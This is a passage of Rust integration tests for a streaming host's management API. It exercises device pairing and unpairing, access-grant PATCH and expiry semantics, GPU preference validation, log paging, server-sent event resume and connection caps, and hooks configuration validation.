    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["enabled"], true);
    assert_eq!(b["armed"], false);
    assert!(b["pin"].is_null());

    // Arm → a PIN appears and is readable via status.
    let (s, b) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["armed"], true);
    let pin = b["pin"].as_str().unwrap().to_string();
    assert_eq!(pin.len(), 4);
    let (_, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(b["pin"], pin);
    assert!(b["expires_in_secs"].as_u64().unwrap() <= 60);

    // The QUIC side would read the same live PIN.
    assert_eq!(np.current_pin().as_deref(), Some(pin.as_str()));

    // Pair a client out-of-band, then it shows in the list + can be unpaired.
    np.add("Test Device", "abc123").unwrap();
    let (s, b) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b[0]["name"], "Test Device");
    assert_eq!(b[0]["fingerprint"], "abc123");
    let del = axum::http::Request::delete("/api/v1/native/clients/ABC123")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    let missing = axum::http::Request::delete("/api/v1/native/clients/abc123")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, missing).await.0, StatusCode::NOT_FOUND);

    // Disarm clears the window.
    let del = axum::http::Request::delete("/api/v1/native/pair")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    let (_, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(b["armed"], false);
}

/// The collection delete on the native plane: one call empties the trust store, and repeating it
/// is a zero-count success rather than an error.
#[tokio::test]
async fn native_unpair_all_empties_the_trust_store() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-np-all-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    np.add("Living room TV", "aa11").unwrap();
    np.add("Studio Deck", "bb22").unwrap();
    assert_eq!(np.list().len(), 2);

    let del_all = || {
        axum::http::Request::delete("/api/v1/native/clients")
            .body(Body::empty())
            .unwrap()
    };
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 2);

    // Gone from both the API and the store behind it (one persisted write, not two).
    let (_, body) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    assert!(np.list().is_empty());
    assert!(!np.is_paired("aa11") && !np.is_paired("bb22"));

    // Idempotent — unlike the single delete, which 404s on a fingerprint it cannot find.
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 0);
}

/// Without a native plane there is no trust store to empty — 503, matching every other
/// `/native/*` route (and NOT a silent 200 that would tell the console it had unpaired something).
#[tokio::test]
async fn native_unpair_all_without_a_native_host_is_unavailable() {
    let app = test_app(test_state(), None);
    let req = axum::http::Request::delete("/api/v1/native/clients")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, req).await.0, StatusCode::SERVICE_UNAVAILABLE);
}

#[tokio::test]
async fn pending_devices_approve_and_deny() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-pending-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    // Empty queue.
    let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b.as_array().unwrap().len(), 0);

    // Two devices knock (what the QUIC gate records); they appear in the list.
    np.note_pending("Enrico's MacBook", "aa11", None);
    np.note_pending("device bb22cc33", "bb22", None);
    let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(b.as_array().unwrap().len(), 2);
    assert_eq!(b[0]["name"], "Enrico's MacBook");
    let approve_id = b[0]["id"].as_u64().unwrap();
    let deny_id = b[1]["id"].as_u64().unwrap();

    // Approve the first with an operator label → paired under that name, gone from pending.
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{approve_id}/approve"),
            serde_json::json!({"name": "Office MacBook"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["name"], "Office MacBook");
    assert_eq!(b["fingerprint"], "aa11");
    assert!(np.is_paired("AA11"), "approval pins the fingerprint");

    // Deny the second → dropped, not paired; a re-deny is 404.
    let deny = post_json(
        &format!("/api/v1/native/pending/{deny_id}/deny"),
        serde_json::json!({}),
    );
    assert_eq!(send(&app, deny).await.0, StatusCode::NO_CONTENT);
    assert!(!np.is_paired("bb22"));
    let (s, _) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{deny_id}/deny"),
            serde_json::json!({}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);

    // Queue is empty again; approving a stale id is 404 (keep `{}` = device's own name).
    let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(b.as_array().unwrap().len(), 0);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/123/approve", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

fn patch_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::patch(path)
        .header(axum::http::header::CONTENT_TYPE, "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// Host wall clock, unix seconds — for asserting the relative-in/absolute-stored conversion.
fn wall_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

/// The WP6 acceptance spine: PATCH a device's access → the list reflects it AND the device's
/// live-session watch fires — plus the PATCH's partial semantics (each omitted half keeps its
/// current value; `clear_expiry` makes access permanent) and the `access_level` derivation.
#[tokio::test]
async fn patch_native_access_reflects_in_list_and_fires_watch() {
    use punktfunk_core::quic::{GRANT_GAMEPAD, GRANT_POINTER};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-patch-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    np.add("Living Room TV", "aa11").unwrap();
    // What a live session holds at admission — the edit must reach it within one event.
    let mut rx = np.subscribe("aa11");

    // Guest preset: controller-only for 2 hours. Case-insensitive fingerprint, like DELETE.
    let now = wall_now();
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/AA11",
            serde_json::json!({"grants": GRANT_GAMEPAD, "expires_in_secs": 7200}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["grants"], GRANT_GAMEPAD);
    assert_eq!(b["access_level"], "controller");
    let deadline = b["expires_unix"].as_i64().unwrap();
    assert!(
        (now + 7200..=now + 7202).contains(&deadline),
        "relative expiry stored as an absolute deadline: {deadline}"
    );
    assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");

    // The list reflects the same record (one derivation, no drift).
    let (_, list) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(list[0]["grants"], GRANT_GAMEPAD);
    assert_eq!(list[0]["access_level"], "controller");
    assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);

    // The watch fired — a live session from aa11 saw the edit.
    assert!(rx.has_changed().unwrap(), "the access watch must fire");
    {
        let state = rx.borrow_and_update();
        assert_eq!(state.grants, GRANT_GAMEPAD);
        assert_eq!(state.deadline_unix, Some(deadline));
        assert!(!state.revoked);
    }

    // Partial: a new expiry alone keeps the grants.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"expires_in_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["grants"], GRANT_GAMEPAD, "omitted grants keep current");
    let short_deadline = b["expires_unix"].as_i64().unwrap();
    assert!(short_deadline < deadline, "the expiry did change");

    // Partial: new grants alone keep the expiry — exactly, not re-derived.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"grants": 0}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["access_level"], "view");
    assert_eq!(
        b["expires_unix"].as_i64().unwrap(),
        short_deadline,
        "omitted expiry keeps current"
    );

    // `clear_expiry` makes it permanent; grants (still view) survive.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"clear_expiry": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert!(b["expires_unix"].is_null(), "clear_expiry = permanent");
    assert_eq!(b["access_level"], "view");

    // A mask that is no preset reads as `custom`.
    let (_, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"grants": GRANT_GAMEPAD | GRANT_POINTER}),
        ),
    )
    .await;
    assert_eq!(b["access_level"], "custom");
}

/// The PATCH's refusals: reserved grant bits and the expiry-field conflict are 400s that change
/// nothing, an unknown fingerprint is a 404 (editing access is not a way to pair a device), and
/// no native plane is the usual 503.
#[tokio::test]
async fn patch_native_access_validates_and_404s() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir().join(format!("pf-mgmt-patch-val-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());
    np.add("Deck", "bb22").unwrap();

    // Reserved bits: 400, never silently cleared — and the record is untouched.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 30)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(b["error"].as_str().unwrap().contains("reserved"));
    assert_eq!(np.list()[0].grants, None, "a 400 writes nothing");

    // Conflicting expiry instructions: 400.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"expires_in_secs": 60, "clear_expiry": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(b["error"].as_str().unwrap().contains("clear_expiry"));

    // Unknown fingerprint: 404, and no record appears.
    let (s, _) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/nope99",
            serde_json::json!({"grants": GRANT_GAMEPAD}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    assert!(!np.is_paired("nope99"), "PATCH must never pair a device");

    // No native plane: 503, like every other /native route.
    let plain = test_app(test_state(), None);
    let (s, _) = send(
        &plain,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"grants": GRANT_GAMEPAD}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
}

/// Approve-with-access pins the operator's chosen mask (plan WP6 acceptance): the response is
/// the stored record — grants, absolute expiry, stamped grant time — enforcement agrees, and a
/// re-knock from that fingerprint surfaces the stored access in the pending list. A reserved-bit
/// choice is refused WITHOUT consuming the pending entry.
#[tokio::test]
async fn approve_with_access_pins_the_chosen_mask() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir()
                    .join(format!("pf-mgmt-approve-acc-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    // A fresh (never-paired) knock carries no stored access for the dialog.
    np.note_pending("Guest Phone", "cc33", None);
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    assert!(pend[0]["grants"].is_null());
    assert!(pend[0]["access_level"].is_null());
    let id = pend[0]["id"].as_u64().unwrap();

    // Reserved bits: 400, and the knock is still there to approve properly.
    let (s, _) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 31)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(
        np.pending_contains("cc33"),
        "a 400 must not consume the knock"
    );
    assert!(!np.is_paired("cc33"));

    // The guest preset: controller-only, 4 hours.
    let now = wall_now();
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"name": "Guest Phone", "grants": GRANT_GAMEPAD, "expires_in_secs": 14400}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["name"], "Guest Phone");
    assert_eq!(b["grants"], GRANT_GAMEPAD);
    assert_eq!(b["access_level"], "controller");
    let deadline = b["expires_unix"].as_i64().unwrap();
    assert!((now + 14400..=now + 14402).contains(&deadline));
    assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");
    // Enforcement agrees with the payload.
    assert_eq!(np.effective("cc33", now), Some(GRANT_GAMEPAD));

    // A later re-knock (the expired-guest flow) shows the STORED access to the approve dialog.
    np.note_pending("Guest Phone", "cc33", None);
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(pend[0]["grants"], GRANT_GAMEPAD);
    assert_eq!(pend[0]["access_level"], "controller");
    assert_eq!(pend[0]["expires_unix"].as_i64().unwrap(), deadline);
}

/// Arm-with-access: the armed window carries the operator's choice (relative expiry already made
/// absolute) and the ceremony inherits it — while a reserved-bit choice is refused BEFORE a
/// window opens.
#[tokio::test]
async fn arm_with_access_ceremony_inherits_the_choice() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-arm-acc-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    // Reserved bits: 400 and NO window — a rejected request must not leave pairing open.
    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 29)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(!np.status().armed, "a 400 must not arm the window");

    let now = wall_now();
    let (s, b) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60, "grants": GRANT_GAMEPAD, "expires_in_secs": 3600}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["armed"], true);
    let carried = np.armed_access().expect("the window carries the choice");
    assert_eq!(carried.grants, GRANT_GAMEPAD);
    let deadline = carried.expires_unix.expect("absolute deadline");
    assert!((now + 3600..=now + 3602).contains(&deadline));

    // The ceremony choke point consumes `armed_access()` (WP2) — pairing under it inherits the
    // window's choice, which is then what enforcement sees.
    np.add_with_access("Guest Deck", "dd44", np.armed_access())
        .unwrap();
    assert_eq!(np.effective("dd44", now), Some(GRANT_GAMEPAD));
    let (_, list) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(list[0]["access_level"], "controller");
    assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);
}

/// Back-compat: approve and arm WITHOUT the new access fields behave exactly as before grants
/// existed — no explicit choice reaches the store (`None`), so a new device gets the legacy
/// full/permanent record (all access fields absent) and the list derives `full`.
#[tokio::test]
async fn approve_and_arm_without_access_fields_keep_todays_behavior() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir()
                    .join(format!("pf-mgmt-acc-compat-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    // Arm with only the legacy fields → the window carries NO access choice.
    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(np.armed_access(), None, "no fields = no choice");

    // Approve with only a name → the stored record is the legacy full/permanent one.
    np.note_pending("Old Laptop", "ee55", None);
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    let id = pend[0]["id"].as_u64().unwrap();
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"name": "Old Laptop"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert!(
        b["grants"].is_null(),
        "no choice = the absent-grants record"
    );
    assert!(b["expires_unix"].is_null());
    assert!(b["granted_unix"].is_null());
    assert_eq!(b["access_level"], "full", "absent grants read as full");
    let stored = &np.list()[0];
    assert_eq!(stored.grants, None);
    assert_eq!(stored.expires_unix, None);
    assert_eq!(stored.granted_unix, None);
}

#[tokio::test]
async fn native_endpoints_report_disabled_without_native_host() {
    let app = test_app(test_state(), None);
    let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["enabled"], false);
    // Arming a host that isn't running the native server is a 503.
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pair/arm", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
    // Pending list reads as an empty array (like /native/clients), not a 503.
    let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b.as_array().unwrap().len(), 0);
    // Approve/deny without a native host are 503.
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/0/approve", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/0/deny", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
}

fn put_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::put(path)
        .header(axum::http::header::CONTENT_TYPE, "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// The GPU endpoints: the inventory GET always answers (an empty list on a GPU-less box —
/// the schema is platform-independent), and the preference PUT validates mode + gpu_id
/// BEFORE touching the persisted store, so a bad request can never write.
#[tokio::test]
async fn gpu_endpoints_list_and_validate() {
    let app = test_app(test_state(), None);

    let (s, b) = send(&app, get_req("/api/v1/gpus")).await;
    assert_eq!(s, StatusCode::OK);
    assert!(b["gpus"].is_array());
    assert!(b["mode"].is_string());
    // The host.env encoder pin is part of the schema (null when nothing is pinned) — the
    // console warns off it when a pin contradicts the selected GPU (the pin is overridden at
    // session open, and without this field the selection would just look broken).
    assert!(
        b.as_object().unwrap().contains_key("encoder_pin"),
        "listGpus must carry encoder_pin"
    );

    // Unknown mode → 400.
    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "fastest"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    // `manual` without a gpu_id → 400.
    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "manual"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    // `manual` with an id that is not a present GPU → 400 (the console only offers listed ids).
    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "manual", "gpu_id": "ffff-ffff-9"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn logs_endpoint_pages_by_cursor() {
    let app = test_app(test_state(), None);

    // The ring is a process-wide singleton — start from wherever its cursor currently is. Other
    // tests in this binary legitimately log (e.g. the identity tests' adopt/migrate lines), so a
    // page can carry THEIR entries interleaved with ours: assert on OUR markers within the page,
    // never on the page being exactly ours (that raced once and failed the suite).
    let (s, json) = send(&app, get_req("/api/v1/logs")).await;
    assert_eq!(s, StatusCode::OK);
    let start = json["next"].as_u64().unwrap();

    let ring = crate::log_capture::ring();
    ring.push(&tracing::Level::WARN, "mgmt::tests", "first".into());
    ring.push(&tracing::Level::INFO, "mgmt::tests", "second".into());

    let (s, json) = send(&app, get_req(&format!("/api/v1/logs?after={start}"))).await;
    assert_eq!(s, StatusCode::OK);
    let entries = json["entries"].as_array().unwrap();
    let ours: Vec<_> = entries
        .iter()
        .filter(|e| e["target"] == "mgmt::tests")
        .collect();
    assert_eq!(ours.len(), 2, "both markers on the page, in order");
    assert_eq!(ours[0]["msg"], "first");
    assert_eq!(ours[0]["level"], "WARN");
    assert_eq!(ours[1]["msg"], "second");
    let next = json["next"].as_u64().unwrap();
    assert_eq!(
        next,
        start + entries.len() as u64,
        "the cursor advances by exactly the entries served"
    );
    assert_eq!(json["dropped"], false);

    // Nothing newer than the served cursor at the time we ask — the page may again carry a
    // concurrent test's fresh entries, but never our (already-served) markers a second time.
    let (s, json) = send(&app, get_req(&format!("/api/v1/logs?after={next}"))).await;
    assert_eq!(s, StatusCode::OK);
    assert!(json["entries"]
        .as_array()
        .unwrap()
        .iter()
        .all(|e| e["target"] != "mgmt::tests"));
    assert!(json["next"].as_u64().unwrap() >= next);
}

// ------------------------------------------------------------------ events (SSE)

/// Serializes the events-route tests: they share the process-global event bus and the
/// connection-cap counter, so the cap test must never 503 a concurrently running stream test.
static EVENTS_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// `get_req` + the default test bearer, pre-attached (these tests read streaming bodies
/// directly instead of going through `send`).
fn events_req(path: &str) -> axum::http::Request<Body> {
    let mut req = get_req(path);
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer test-secret"),
    );
    req
}

/// The next SSE frame as text, or `None` when the stream ended / nothing arrived in time.
async fn next_sse_chunk(body: &mut Body) -> Option<String> {
    match tokio::time::timeout(std::time::Duration::from_secs(5), body.frame()).await {
        Ok(Some(Ok(frame))) => frame
            .into_data()
            .ok()
            .map(|b| String::from_utf8_lossy(&b).into_owned()),
        _ => None,
    }
}

/// Every `data:` payload in accumulated SSE text, parsed as JSON.
fn sse_data_events(text: &str) -> Vec<serde_json::Value> {
    text.lines()
        .filter_map(|l| l.strip_prefix("data: "))
        .filter_map(|d| serde_json::from_str(d).ok())
        .collect()
}

#[tokio::test]
async fn events_stream_requires_bearer() {
    let app = test_app(test_state(), None);
    let mut req = get_req("/api/v1/events");
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer wrong"),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

/// The full consumer contract on one route: ring catch-up, the server-side kind filter, the
/// live tail on the same connection, `?since=`/`Last-Event-ID` resume, and the `dropped`
/// marker for a cursor that fell off the ring.
#[tokio::test]
async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
    use crate::events::EventKind;
    let _l = EVENTS_TEST_LOCK.lock().await;
    let app = test_app(test_state(), None);
    let uniq = format!("evt-{}-{:p}", std::process::id(), &0u8 as *const u8);
    let m1 = format!("{uniq}-one");

    // Noise of a different kind (must be filtered out), then our marker.
    crate::events::emit(EventKind::DisplayReleased { count: 424_242 });
    crate::events::emit(EventKind::LibraryChanged { source: m1.clone() });

    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events?kinds=library.changed"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::OK);
    let ctype = resp
        .headers()
        .get(axum::http::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    assert!(
        ctype.starts_with("text/event-stream"),
        "content-type: {ctype}"
    );

    // Catch-up must deliver m1 (other tests' library.changed events may interleave — scan).
    let mut body = resp.into_body();
    let mut seen = String::new();
    while !seen.contains(&m1) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("catch-up delivers the marker event");
        seen.push_str(&chunk);
    }
    assert!(
        !seen.contains("event: display.released"),
        "kind filter must drop other kinds: {seen}"
    );
    assert!(
        seen.contains("event: library.changed"),
        "frame kind: {seen}"
    );
    let m1_seq = sse_data_events(&seen)
        .iter()
        .find(|e| e["source"] == m1.as_str())
        .and_then(|e| e["seq"].as_u64())
        .expect("marker frame carries the full event JSON with its seq");

    // Live tail on the SAME connection. If a concurrent test floods the broadcast channel the
    // slow-consumer cut ends this stream — then the documented client move (reconnect with the
    // last seen id) must deliver m2 instead, so follow it rather than flaking.
    let m2 = format!("{uniq}-two");
    crate::events::emit(EventKind::LibraryChanged { source: m2.clone() });
    let mut tail = String::new();
    loop {
        match next_sse_chunk(&mut body).await {
            Some(chunk) => {
                tail.push_str(&chunk);
                if tail.contains(&m2) {
                    break;
                }
            }
            None => {
                let resp = app
                    .clone()
                    .oneshot(events_req(&format!(
                        "/api/v1/events?since={m1_seq}&kinds=library.changed"
                    )))
                    .await
                    .expect("infallible");
                body = resp.into_body();
            }
        }
    }
    drop(body);

    // Resume from m1's seq: m2 is caught up, m1 is not.
    let resp = app
        .clone()
        .oneshot(events_req(&format!(
            "/api/v1/events?since={m1_seq}&kinds=library.changed"
        )))
        .await
        .expect("infallible");
    let mut body = resp.into_body();
    let mut resumed = String::new();
    while !resumed.contains(&m2) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("resume catch-up delivers m2");
        resumed.push_str(&chunk);
    }
    assert!(!resumed.contains(&m1), "since-cursor must exclude m1");
    drop(body);

    // Last-Event-ID beats ?since (it is the newer cursor on an SSE auto-reconnect).
    let mut req = events_req("/api/v1/events?since=0&kinds=library.changed");
    req.headers_mut().insert(
        "last-event-id",
        axum::http::HeaderValue::from_str(&m1_seq.to_string()).unwrap(),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    let mut body = resp.into_body();
    let mut resumed = String::new();
    while !resumed.contains(&m2) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("header-resume catch-up delivers m2");
        resumed.push_str(&chunk);
    }
    assert!(!resumed.contains(&m1), "Last-Event-ID must exclude m1");
    drop(body);

    // A cursor that fell off the ring gets the dropped marker first. Flood the ring past
    // capacity, then resume from seq 1.
    for _ in 0..1100 {
        crate::events::emit(EventKind::DisplayReleased { count: 1 });
    }
    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events?since=1"))
        .await
        .expect("infallible");
    let mut body = resp.into_body();
    let first = next_sse_chunk(&mut body).await.expect("dropped marker");
    assert!(first.contains("event: dropped"), "first frame: {first}");
    assert!(
        first.contains(r#"{"dropped":true}"#),
        "marker data: {first}"
    );
}

#[tokio::test]
async fn events_stream_connection_cap() {
    let _l = EVENTS_TEST_LOCK.lock().await;
    let app = test_app(test_state(), None);

    let slots = super::events::test_support::saturate_slots();
    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
    drop(slots);

    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::OK, "cap frees with the slots");
}

// ------------------------------------------------------------------ hooks

/// GET returns the (empty-when-unconfigured) config; PUT validation rejects structural errors
/// with the reason. A *successful* PUT is deliberately not exercised through the route — it
/// would write the developer's real config dir; persistence is unit-tested in `crate::hooks`
/// against a temp path.
#[tokio::test]
async fn hooks_get_shape_and_put_validation() {
    let app = test_app(test_state(), None);

    let (s, json) = send(&app, get_req("/api/v1/hooks")).await;
    assert_eq!(s, StatusCode::OK);
    assert!(json["hooks"].is_array());

    let put = |body: serde_json::Value| {
        axum::http::Request::put("/api/v1/hooks")
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    // Structurally invalid: an entry with no action.
    let (s, json) = send(
        &app,
        put(serde_json::json!({"hooks": [{"on": "stream.started"}]})),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(
        json["error"].as_str().unwrap().contains("run"),
        "error names the problem: {json}"
    );

    // Non-http(s) webhook.
    let (s, _) = send(
        &app,
        put(serde_json::json!({"hooks": [{"on": "pairing.*", "webhook": "ftp://x"}]})),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    // Wrong bearer → 401 (the hooks surface is admin-lane).
    let mut req = get_req("/api/v1/hooks");
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer wrong"),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

// ------------------------------------------------------------------ library scanners

/// The source list is plugin-shaped and read-only-safe; the toggle rejects unknown ids
/// with 404. (A successful toggle PUT would write the developer's real
/// `library-scanners.json`, so the write path is exercised only through the unknown-id
/// rejection here — the settings round-trip itself is unit-tested in `library::scanners`
/// against pure shapes.)
///
/// This used to assert that `steam` is present on every platform, which was the defining property
/// while the scanners were compiled in. It is deliberately gone: the list is now derived entirely
/// from what the operator has installed, so on a host with no library plugins it is legitimately
/// empty. What replaces it is the invariant that outlives the built-ins — **every** row is a plugin.
#[tokio::test]
async fn library_scanner_list_and_unknown_toggle() {
    let app = test_app(test_state(), None);

    let (s, json) = send(&app, get_req("/api/v1/library/scanners")).await;
    assert_eq!(s, StatusCode::OK);
    let scanners = json.as_array().expect("a scanner array");
    assert!(
        scanners.iter().all(|sc| sc["origin"] == "plugin"),
        "no host build reports a builtin source any more: {json}"
    );
    assert!(
        scanners.iter().all(|sc| sc["id"].is_string()
            && sc["label"].is_string()
